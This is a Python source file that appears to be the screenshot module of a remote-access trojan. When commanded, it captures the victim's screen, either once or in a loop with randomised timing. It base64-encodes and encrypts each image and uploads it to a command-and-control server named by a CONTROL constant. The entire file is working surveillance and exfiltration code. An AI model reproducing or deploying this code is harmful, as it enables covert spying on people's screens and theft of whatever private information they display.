import base64
import io
import random
import threading
import time
import pyautogui
import requests
from constants import CONTROL
from datetime import datetime
import pyutils.encryption_utils as eu

def handle_screenshot(message):
    split = message.split(" ")
    interval = 30
    count = 0
    if len(split) > 1:
        interval = int(split[1])
        count = int(split[2])
    else: return handle_screenshot_helper()

    t = threading.Thread(target=screenshot_looper, args=[interval, count])
    t.start()
    return "Start screenshot loop"

def screenshot_looper(interval, count):
    buffer = interval * 0.15
    adjusted = random.randint((interval-buffer) * 100, (interval+buffer)*100) / 100
    for _ in range(count):
        handle_screenshot_helper(False)
        time.sleep(adjusted)

def handle_screenshot_helper(alone=True):
    screenshot = pyautogui.screenshot()
    im_stream = io.BytesIO()
    screenshot.save(im_stream, format="PNG")
    im_stream.seek(0)
    try:
        image_bytes = im_stream.read()
        encoded_image = base64.b64encode(image_bytes).decode('utf-8')
        encrypted_image = eu.encrypt(encoded_image)

        filename = f'{datetime.now().strftime("%d-%b-%Y %H-%M-%S-%f")}.png'
        r = requests.post(f"{CONTROL}/upload", files={'image': (filename, encrypted_image, 'image/png')})
        if alone: return "Successfully sent screenshot"
    except Exception as e:
        if alone: return f"{e} : Failed to send screenshot"
